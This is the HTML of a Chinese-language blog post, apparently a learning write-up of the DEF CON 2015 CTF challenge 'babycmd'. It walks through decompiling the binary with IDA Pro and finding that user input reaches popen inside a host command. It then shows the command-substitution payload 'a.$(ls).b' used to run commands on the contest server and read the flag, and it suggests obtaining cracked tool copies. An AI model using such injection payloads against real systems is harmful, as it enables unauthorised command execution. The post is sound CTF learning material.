@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>defcon_babycmd | Mars&#39; Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="2015年 的 defcon 就在我隊一題都沒解出來之下結束了，雖然有點糗但是小弟把比賽的部分題目及檔案順手備份了下來，搭配查尋神人們提供的解答記錄神人們的嘗試過程，期待下次參賽能多答幾題阿阿阿。。。">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="defcon_babycmd">
+<meta property="og:url" content="http://yojo3000.github.io/CTF/defcon-babycmd/index.html">
+<meta property="og:site_name" content="Mars&#39; Blog">
+<meta property="og:description" content="2015年 的 defcon 就在我隊一題都沒解出來之下結束了，雖然有點糗但是小弟把比賽的部分題目及檔案順手備份了下來，搭配查尋神人們提供的解答記錄神人們的嘗試過程，期待下次參賽能多答幾題阿阿阿。。。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd.PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(1).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(2).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(3).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(4).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(6).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(8).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(7).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(9).PNG">
+<meta property="og:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd(10).PNG">
+<meta property="og:updated_time" content="2017-11-27T10:51:36.978Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="defcon_babycmd">
+<meta name="twitter:description" content="2015年 的 defcon 就在我隊一題都沒解出來之下結束了，雖然有點糗但是小弟把比賽的部分題目及檔案順手備份了下來，搭配查尋神人們提供的解答記錄神人們的嘗試過程，期待下次參賽能多答幾題阿阿阿。。。">
+<meta name="twitter:image" content="http://yojo3000.github.io/CTF/defcon-babycmd/images/babycmd.PNG">
+  
+    <link rel="alternate" href="/atom.xml" title="Mars&#39; Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mars&#39; Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yojo3000.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-defcon-babycmd" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/CTF/defcon-babycmd/" class="article-date">
+  <time datetime="2015-05-30T07:14:17.000Z" itemprop="datePublished">2015-05-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      defcon_babycmd
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> 2015年 的 defcon 就在我隊一題都沒解出來之下結束了，雖然有點糗但是小弟把比賽的部分題目及檔案順手備份了下來，搭配查尋神人們提供的解答記錄神人們的嘗試過程，期待下次參賽能多答幾題阿阿阿。。。<br><a id="more"></a><br>此次 defcon 的題目分成這五大類:</p>
+<ol>
+<li>Baby’s First</li>
+<li>Coding Challenge</li>
+<li>MisCellaneous</li>
+<li>Pwnable</li>
+<li>Reverse Engineering</li>
+</ol>
+<blockquote class="pullquote [class]"><p>content</p>
+</blockquote>
+<p>此文重點 babycmd 為 Baby’s First 題型中的第一題，顧名思義就是連 baby 都會的東西(羞愧)，而 cmd 則暗示著這是在 terminal 就能解決的問題，題目如下圖<br><img style="width: 700px;" src="images/babycmd.PNG"></p>
+<p>從圖中的 download 按鈕就能下載該題提供的檔案</p>
+<p><a style="text-decoration: underline;" href="https://drive.google.com/open?id=0BzGd3Qn1ZnTeR2JFREVraVJJUUE&authuser=0" target="_blank" rel="noopener">babycmd Download file</a></p>
+<p>下載之後發現檔名是個莫名其妙且沒有附檔名的未知檔案<br>(babycmd_3ad28b10e8ab283d7df81795075f600b)</p>
+<p>從 windows 底下沒辦法正常的使用這個檔案，推測大概是 linux 下才能使用，因此在 virtualbox 中事先準備好的 ubuntu 來開啟這個檔案，關於虛擬機的架設及共用資料夾設定請看下列文章</p>
+<p><a style="text-decoration: underline;" href="http://blog.xuite.net/yh96301/blog/74139222-VirtualBox+4.2%E5%AE%89%E8%A3%9DUbuntu+13.04" target="_blank" rel="noopener">虛擬機安裝 Ubuntu</a></p>
+<p><a style="text-decoration: underline;" href="http://www.arthurtoday.com/2009/11/ubuntu-virtualbox-guest-addition.html" target="_blank" rel="noopener">安裝 Guest Addition</a></p>
+<p><a style="text-decoration: underline;" href="http://briian.com/6241/virtualbox-share-folder.html/2" target="_blank" rel="noopener">共用資料夾設定</a></p>
+<p><a style="text-decoration: underline;" href="http://www.arthurtoday.com/2010/04/ubuntu-virtualbox.html" target="_blank" rel="noopener">開機自動掛載分享資料夾</a></p>
+<p>進入 Ubuntu 並從共用資料夾取得該檔案之後，首先就是先查詢一下這個檔案到底是什麼，可以利用 file 指令查詢</p>
+<figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file babycmd_3ad28b10e8ab283d7df81795075f600b</span><br></pre></td></tr></table></figure>
+<p>得到該結果</p>
+<p><img style="width: 700px;" src="images/babycmd(1).PNG"></p>
+<p>從上圖中可知該檔案為適用於 64 bit linux os 的 ELF 執行檔，因此嘗試執行之</p>
+<figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./babycmd_3ad28......(檔名)</span><br></pre></td></tr></table></figure>
+<p>發現好像不能執行，一般而言不能執行的原因大概是因為權限問題，如果該檔案不提供執行權限的話當然就沒辦法執行，因此透過指令檢查檔案權限</p>
+<figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>
+<p><img style="width: 700px;" src="images/babycmd(2).PNG"></p>
+<p>從前面的 -r–r–r– 得知該檔案目前只允許讀取(read)，不允許寫入(write)和執行(execute)，因此嘗試修改該檔案的權限<br>(其實原本檔案的權限好像不是長這樣，但是反正就是不能執行)</p>
+<figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 babycmd_3ad28......(檔名)</span><br></pre></td></tr></table></figure>
+<p>關於檔案權限的概念及操作細節請看此文<br><a style="text-decoration: underline;" href="http://zh.wikipedia.org/wiki/Chmod" target="_blank" rel="noopener">chmod 教學</a></p>
+<p>總之設定成 777 就代表該擋案可以被</p>
+<ol>
+<li>文件擁有者</li>
+<li>文件擁有者所在之群組的使用者</li>
+<li>其他使用者<br>做讀取，寫入，執行</li>
+</ol>
+<p>此時再做一次 ls -al 就會發現權限改變了<br><img style="width: 700px;" src="images/babycmd(3).PNG"></p>
+<p>改變權限之後應該就可以執行囉，執行後出現一個操作介面</p>
+<p><img style="width: 700px;" src="images/babycmd(4).PNG"></p>
+<p>這個程式看起來提供使用者輸入一些指令，分別是 ping dig host exit，這些指令都是 linux 常用的網路相關指令，詳細使用方式請看連結</p>
+<p><a style="text-decoration: underline;" href="http://linux.vbird.org/linux_server/0140networkcommand.php" target="_blank" rel="noopener">網路常用指令教學</a></p>
+<p>對於這種提供 command 的程式第一個想法就是 buffered overflow，可透過輸入各種形式的字串找出程式沒有檢查到的輸入格式漏洞，例如:</p>
+<ol>
+<li>極長的字串 e.g.: 1000個a</li>
+<li>包含 %s %d %p 等 C/C++ 語言中的 printf 資料型態引數 (format string)</li>
+<li>空字串</li>
+<li>包含二進位資料的字串</li>
+<li>常用的 admin password 等</li>
+</ol>
+<p>但是在這個程式中好像沒有測出可疑的 output，既然在程式表面提供的操作介面沒有線索的話，那就朝內部挖掘吧，”內部”可以有很多種形式，例如可以將檔案反組譯成組合語言，或是用16進位(hex)、2進位(binary)等等表示方式，至於要怎麼將檔案拆解(逆向工程)呢？先來介紹下工具吧！</p>
+<p><a style="text-decoration: underline;" href="#">IDA Pro</a></p>
+<p>IDA Pro 是 Windows 底下最常被使用的工具，可以用來反組譯(disassemble)，各種進位拆解，甚至可以反編譯(decompile)回 C 語言</p>
+<p><a style="text-decoration: underline;" href="#">Hopper</a></p>
+<p>hopper 是可以在 Linux 及 OSX 下的逆向工具，因為 CTF 常常需要在 Linux 環境下操作，如果不想另外準備 Windows 的話可以考慮使用此工具<br><span style="color: red;">(因為這兩個貌似不是免費的，請自己找破解或是於官網購買)</span></p>
+<p><br><br><br></p>
+<p>這裡使用 ida pro (for windows) 操作，其實兩者操作方式還蠻接近的，若需要 hopper 教學請看此 youtube 教學</p>
+<p><a style="text-decoration: underline;" href="https://www.youtube.com/watch?v=Q6Us1AGnj5c" target="_blank" rel="noopener">hopper 操作教學影片</a></p>
+<p>開啟 ida pro 後匯入欲處理的檔案，程式會將其反組譯成組合語言，CTF 的題目中常常會把線索藏在組合語言或是 16 進位之中</p>
+<p><img style="width: 700px;" src="images/babycmd(6).PNG"></p>
+<p>ida pro 可以將組合語言反組譯成 C 語言，利用 File-&gt;produce file-&gt;create C file 就可以得到 .c 檔案</p>
+<p>在 C file 中可以看到許多檢查輸入的方式，而其中一個輸出有些許異常</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_DCC((__int64)&amp;cp) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Invalid hostname."</span>);</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v8;</span><br><span class="line">&#125;</span><br><span class="line">__sprintf_chk(&amp;command, <span class="number">1L</span>L, <span class="number">384L</span>L, <span class="string">"host \"%s\""</span>, &amp;cp);</span><br></pre></td></tr></table></figure>
+<p>該程式把接受使用者輸入值的變數做 print 輸出來當作 linux 指令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\_\_sprintf_chk(&amp;command, <span class="number">1L</span>L, <span class="number">384L</span>L, <span class="string">"host \"%s\""</span>, &amp;cp);</span><br></pre></td></tr></table></figure>
+<p>而在 linux 中對於變數的處理方式有下列特色</p>
+<p><img style="width: 500px;" src="images/babycmd(8).PNG"></p>
+<p>其中雙引號中的 $var 會被當作變數處理，而單引號中的 $var 則被當作字串處理</p>
+<p>可以發現在 host 檢查指令中特別加上了 \” ，做正規表達故意將雙引號當做輸出的一部分<br><img style="width: 700px;" src="images/babycmd(7).PNG"></p>
+<p><br><br>(若不對雙引號做正規表達式，那該雙引號就會對照到前面的雙引號而讓字串結束)</p>
+<p>若有疑問可見 <a style="text-decoration: underline;" href="https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Obsolete_Pages/Obsolete_Pages/Obsolete_Pages/%E6%AD%A3%E8%A6%8F%E8%A1%A8%E9%81%94%E5%BC%8F%E6%A8%A1%E5%BC%8F%E7%9A%84%E7%B7%A8%E5%AF%AB" target="_blank" rel="noopener">正規表達式教學</a></p>
+<p><br><br><br></p>
+<p>先介紹另一種 linux 的指令使用方式<br>指令替代 (command substitution)</p>
+<p><img style="width: 700px;" src="images/babycmd(9).PNG"></p>
+<p>若在變數中包覆 linux 指令(ls)當做echo 的 input 的話就會被視為指令使用，而且在外圍包覆雙引號(“”)也能成功執行</p>
+<p>因此，如果提供的使用者輸入包含了加上雙引號的指令替代，那 linux 就執行這個 output 中的指令</p>
+<p>回頭檢視整段檢查 function</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_10BD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// rax@6</span></span><br><span class="line">  FILE *v2; <span class="comment">// rbp@10</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">v4</span>;</span> <span class="comment">// [sp+0h] [bp-538h]@5</span></span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [sp+10h] [bp-528h]@6</span></span><br><span class="line">  <span class="keyword">char</span> cp; <span class="comment">// [sp+190h] [bp-3A8h]@3</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+310h] [bp-228h]@12</span></span><br><span class="line">  __int64 v8; <span class="comment">// [sp+518h] [bp-20h]@1</span></span><br><span class="line"></span><br><span class="line">  v8 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_D65(a1, (__int64)&amp;cp) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( inet_aton(&amp;cp, &amp;v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = inet_ntoa(v4);</span><br><span class="line">        __sprintf_chk(&amp;command, <span class="number">1L</span>L, <span class="number">384L</span>L, <span class="string">"host %s"</span>, v1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_DCC((__int64)&amp;cp) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Invalid hostname."</span>);</span><br><span class="line">          <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v8;</span><br><span class="line">        &#125;</span><br><span class="line">        __sprintf_chk(&amp;command, <span class="number">1L</span>L, <span class="number">384L</span>L, <span class="string">"host \"%s\""</span>, &amp;cp);</span><br><span class="line">      &#125;</span><br><span class="line">      v2 = popen(&amp;command, <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">512</span>, v2) )</span><br><span class="line">          __printf_chk(<span class="number">1L</span>L, &amp;s);</span><br><span class="line">        pclose(v2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Command failed."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid Host or IP address sent to dig."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"No address specified."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>從 else 的 output 可以看出程式逐項檢查輸入值的原則，而異常輸出的觸發條件是在<br>“當輸入的值 (ip) 的格式合法(valid) 時，若該 hostname 不存在 (invalid host name) “<br>因此搭配指令替代提供下列輸入</p>
+<figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">host a.$(ls).b</span><br><span class="line">// 常見的 ip 或是 hostname 的格式為 xxx.xxx.....</span><br></pre></td></tr></table></figure>
+<p>得到的輸出如下</p>
+<p><img style="width: 700px" src="images/babycmd(10).PNG"></p>
+<p>可知已經成功的利用摻雜 linux 指令的輸入讓程式出現預期之外的結果，ls 指令成功的列出了目前所在位置的檔案</p>
+<p>既然可以利用輸入下指令那就好辦啦，現在利用 nc 指令連結至題目提供的位置<br>(即為第一張圖中的奇怪字串，但是他其實是個 domain name 這樣)<br><figure class="highlight plain"><figcaption><span>Linux Command</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491</span><br></pre></td></tr></table></figure></p>
+<p>nc 指令可參考此文<a style="text-decoration: underline;" href="http://linux.vbird.org/linux_server/0140networkcommand.php#nc" target="_blank" rel="noopener">Linux 常用網路指令</a></p>
+<p>連結之後就會連結到比賽主機的 babycmd 程式，透過相同手法可以摻雜 linux command 得到各種訊息，例如帳號名稱，家目錄檔案等等</p>
+<p>而本題的答案 (flag) 就放在帳號家目錄中 (/home/babycmd/flag)，用 cat 指令就可以成功 catch the flag (CTF) 囉！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yojo3000.github.io/CTF/defcon-babycmd/" data-id="cjbfvxh3f000p97pwzxhl2fuy" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/Linux-Server/Apache-configure-https/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Apache_configure_https
+        
+      </div>
+    </a>
+  
+  
+    <a href="/uncategorized/buildHexo/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Hexo in Github page</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux-Server/">Linux Server</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apache-SSL/">Apache SSL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Apache-SSL/" style="font-size: 10px;">Apache SSL</a> <a href="/tags/forensics/" style="font-size: 10px;">forensics</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/uncategorized/Chenk-Kung-Hill/">成功嶺新訓筆記</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Bubble-Sort/">Bubble-Sort</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Return-to-libc/">Return to libc</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Wireshark-Package-Analysis/">Wireshark Package Analysis</a>
+          </li>
+        
+          <li>
+            <a href="/CTF/Shellcode/">Shellcode</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Mars Huang<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
